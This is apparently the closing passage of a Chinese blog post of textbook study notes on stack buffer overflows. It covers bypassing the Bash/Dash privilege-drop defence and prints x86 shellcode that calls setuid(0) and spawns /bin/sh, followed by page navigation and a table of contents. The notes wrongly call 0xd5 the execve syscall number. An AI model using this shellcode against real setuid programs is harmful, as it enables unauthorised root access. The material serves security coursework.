+<li>缓冲区溢出攻击中，绕过Bash&#x2F;Dash防御的方法：<ul>
+<li>不执行&#x2F;bin&#x2F;sh，而是执行没有防御机制的shell，如&#x2F;bin&#x2F;zsh</li>
+<li>提前使用系统调用setuid(0)，将RUID改为0</li>
+</ul>
+</li>
+<li>增加setuid(0)的shellcode：<ul>
+<li>ebx置0，eax&#x3D;0xd5即execve的系统调用号，最后int 0x80执行系统调用。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">shellcode=( </span><br><span class="line">    <span class="string">&quot;\x31&quot;</span><span class="string">&quot;\xc0&quot;</span> 	  <span class="comment"># xorl %eax,%eax </span></span><br><span class="line">    <span class="string">&quot;\x31&quot;</span><span class="string">&quot;\xdb&quot;</span>      <span class="comment"># xorl %ebx,%ebx</span></span><br><span class="line">    <span class="string">&quot;\xb0&quot;</span><span class="string">&quot;\xd5&quot;</span>      <span class="comment"># movb $0xd5,%al</span></span><br><span class="line">    <span class="string">&quot;\xcd&quot;</span><span class="string">&quot;\x80&quot;</span>	  <span class="comment"># int $0x80	</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="string">&quot;\x31\xc0&quot;</span> 		<span class="comment"># xorl %eax,%eax </span></span><br><span class="line">    <span class="string">&quot;\x50&quot;</span>			<span class="comment"># push1 %eax </span></span><br><span class="line">    <span class="string">&quot;\x68&quot;</span><span class="string">&quot;//sh&quot;</span> 	<span class="comment"># push1 $0x68732f2f </span></span><br><span class="line">    <span class="string">&quot;\x68&quot;</span><span class="string">&quot;/bin&quot;</span>	<span class="comment"># push1 $0x6e69622f </span></span><br><span class="line">	<span class="string">&quot;\x89\xe3&quot;</span>		<span class="comment"># movl	%esp,%ebx </span></span><br><span class="line">    <span class="string">&quot;\x50&quot;</span>			<span class="comment"># push1	%eax</span></span><br><span class="line">	<span class="string">&quot;\x53&quot;</span>			<span class="comment"># push1 %ebx </span></span><br><span class="line">    <span class="string">&quot;\x89\xe1&quot;</span>		<span class="comment"># mov1 %esp,%ecx </span></span><br><span class="line">    <span class="string">&quot;\x99&quot;</span>			<span class="comment"># cdq </span></span><br><span class="line">    <span class="string">&quot;\xb0\x0b&quot;</span>		<span class="comment"># movb $0x0b,%al </span></span><br><span class="line">    <span class="string">&quot;\xcd\x80&quot;</span>		<span class="comment"># int $0x80</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)	</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/10/17/04_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">http://example.com/2023/10/17/04_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/">软件安全测试</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/10/17/03_ShellShockAttack/" title="Lab02《计算机安全导论：深度实践》ShellShock实验"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Lab02《计算机安全导论：深度实践》ShellShock实验</div></div></a></div><div class="next-post pull-right"><a href="/2023/10/17/03_ShellShock%E6%94%BB%E5%87%BB/" title="《计算机安全导论：深度实践》第三章ShellShock"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">《计算机安全导论：深度实践》第三章ShellShock</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/10/17/01-Set-UID%E7%89%B9%E6%9D%83%E7%A8%8B%E5%BA%8F/" title="《计算机安全导论：深度实践》第一章Set-UID特权程序学习笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-17</div><div class="title">《计算机安全导论：深度实践》第一章Set-UID特权程序学习笔记</div></div></a></div><div><a href="/2023/10/17/02-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" title="《计算机安全导论：深度实践》第二章环境变量"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-17</div><div class="title">《计算机安全导论：深度实践》第二章环境变量</div></div></a></div><div><a href="/2023/10/17/02_Lab1%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8ESet-UID/" title="Lab01《计算机安全导论：深度实践》环境变量与Set-UID实验"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-17</div><div class="title">Lab01《计算机安全导论：深度实践》环境变量与Set-UID实验</div></div></a></div><div><a href="/2023/10/17/03_ShellShockAttack/" title="Lab02《计算机安全导论：深度实践》ShellShock实验"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-17</div><div class="title">Lab02《计算机安全导论：深度实践》ShellShock实验</div></div></a></div><div><a href="/2023/10/17/03_ShellShock%E6%94%BB%E5%87%BB/" title="《计算机安全导论：深度实践》第三章ShellShock"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-17</div><div class="title">《计算机安全导论：深度实践》第三章ShellShock</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">一、程序的内存结构：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%A0%88%E4%B8%8E%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">二、栈与函数调用：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%A0%88%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">1、栈的内存布局：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%B8%A7%E6%8C%87%E9%92%88%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">2、帧指针：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%A0%88%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">三、栈的缓冲区溢出攻击：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%A4%8D%E5%88%B6%E6%95%B0%E6%8D%AE%E5%88%B0%E7%BC%93%E5%86%B2%E5%8C%BA%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">1、复制数据到缓冲区：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%EF%BC%9A"><span class="toc-number">3.2.</span> <span class="toc-text">2、缓冲区溢出：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%88%A9%E7%94%A8%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%EF%BC%9A"><span class="toc-number">3.3.</span> <span class="toc-text">3、利用缓冲区溢出：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">四、环境准备：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%85%B3%E9%97%AD%E5%9C%B0%E5%9D%80%E9%9A%8F%E6%9C%BA%E5%8C%96%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">1、关闭地址随机化：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E7%94%9F%E6%88%90%E6%B2%A1%E6%9C%89%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%A8%8B%E5%BA%8F%EF%BC%9A"><span class="toc-number">4.2.</span> <span class="toc-text">2、生成没有防御机制的漏洞程序：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%AE%9E%E6%96%BD%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">五、实施缓冲区溢出攻击：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-number">5.1.</span> <span class="toc-text">1、寻找注入的恶意代码的地址：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%8F%90%E9%AB%98%E7%8C%9C%E6%B5%8B%E7%9A%84%E5%87%86%E7%A1%AE%E7%8E%87%EF%BC%9A"><span class="toc-number">5.2.</span> <span class="toc-text">2、提高猜测的准确率：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F%E6%89%BE%E5%88%B0%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-number">5.3.</span> <span class="toc-text">3、通过调试程序找到地址：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E6%9E%84%E9%80%A0%E8%BE%93%E5%85%A5%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">5.4.</span> <span class="toc-text">4、构造输入文件：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E5%AE%9E%E6%96%BD%E6%94%BB%E5%87%BB%E8%8E%B7%E5%BE%97root%E6%9D%83%E9%99%90%EF%BC%9A"><span class="toc-number">5.5.</span> <span class="toc-text">5、实施攻击获得root权限：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81shellcode%EF%BC%9A"><span class="toc-number">6.</span> <span class="toc-text">六、构造恶意代码shellcode：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81c%E8%AF%AD%E8%A8%80%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%AF%91%EF%BC%9A"><span class="toc-number">6.1.</span> <span class="toc-text">1、c语言直接编译：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%9E%84%E9%80%A0shellcode%E6%A0%B8%E5%BF%83%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">6.2.</span> <span class="toc-text">2、构造shellcode核心方法：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81shellcode%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="toc-number">6.3.</span> <span class="toc-text">3、shellcode示例：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD%EF%BC%9A"><span class="toc-number">7.</span> <span class="toc-text">七、防御措施：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%9B%B4%E5%AE%89%E5%85%A8%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">7.1.</span> <span class="toc-text">1、更安全的函数：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%9B%B4%E5%AE%89%E5%85%A8%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%9A"><span class="toc-number">7.2.</span> <span class="toc-text">2、更安全的动态链接库：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E7%A8%8B%E5%BA%8F%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">7.3.</span> <span class="toc-text">3、程序静态分析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%EF%BC%9A"><span class="toc-number">7.4.</span> <span class="toc-text">4、编程语言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E7%BC%96%E8%AF%91%E5%99%A8%EF%BC%9A"><span class="toc-number">7.5.</span> <span class="toc-text">5、编译器：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%9A"><span class="toc-number">7.6.</span> <span class="toc-text">6、操作系统：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81%E7%A1%AC%E4%BB%B6%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-number">7.7.</span> <span class="toc-text">7、硬件体系结构：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E5%9C%B0%E5%9D%80%E9%9A%8F%E6%9C%BA%E5%8C%96%EF%BC%9A"><span class="toc-number">8.</span> <span class="toc-text">八、地址随机化：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81Linux%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80%E9%9A%8F%E6%9C%BA%E5%8C%96%EF%BC%9A"><span class="toc-number">8.1.</span> <span class="toc-text">1、Linux中的地址随机化：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%9C%B0%E5%9D%80%E9%9A%8F%E6%9C%BA%E5%8C%96%E7%9A%84%E6%9C%89%E6%95%88%E6%80%A7%EF%BC%9A"><span class="toc-number">8.2.</span> <span class="toc-text">2、地址随机化的有效性：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B9%9D%E3%80%81StackGuard%EF%BC%9A"><span class="toc-number">9.</span> <span class="toc-text">九、StackGuard：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%AE%9E%E7%8E%B0%E6%80%9D%E6%83%B3%EF%BC%9A"><span class="toc-number">9.1.</span> <span class="toc-text">1、实现思想：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">9.2.</span> <span class="toc-text">2、手动实现方法：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81gcc%E7%BC%96%E8%AF%91%E5%99%A8%E4%B8%AD%E7%9A%84%E5%AE%9E%E7%8E%B0%EF%BC%9A"><span class="toc-number">9.3.</span> <span class="toc-text">3、gcc编译器中的实现：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E3%80%81%E6%94%BB%E7%A0%B4Bash%E4%B8%8EDash%E7%9A%84%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6%EF%BC%9A"><span class="toc-number">10.</span> <span class="toc-text">十、攻破Bash与Dash的防御机制：</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/17/03_ShellShockAttack/" title="Lab02《计算机安全导论：深度实践》ShellShock实验">Lab02《计算机安全导论：深度实践》ShellShock实验</a><time datetime="2023-10-17T09:10:55.000Z" title="Created 2023-10-17 17:10:55">2023-10-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/17/04_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" title="《计算机安全导论：深度实践》第四章缓冲区溢出">《计算机安全导论：深度实践》第四章缓冲区溢出</a><time datetime="2023-10-17T09:10:55.000Z" title="Created 2023-10-17 17:10:55">2023-10-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/17/03_ShellShock%E6%94%BB%E5%87%BB/" title="《计算机安全导论：深度实践》第三章ShellShock">《计算机安全导论：深度实践》第三章ShellShock</a><time datetime="2023-10-17T09:08:55.000Z" title="Created 2023-10-17 17:08:55">2023-10-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/17/02_Lab1%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8ESet-UID/" title="Lab01《计算机安全导论：深度实践》环境变量与Set-UID实验">Lab01《计算机安全导论：深度实践》环境变量与Set-UID实验</a><time datetime="2023-10-17T09:06:55.000Z" title="Created 2023-10-17 17:06:55">2023-10-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/17/02-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" title="《计算机安全导论：深度实践》第二章环境变量">《计算机安全导论：深度实践》第二章环境变量</a><time datetime="2023-10-17T08:59:30.000Z" title="Created 2023-10-17 16:59:30">2023-10-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
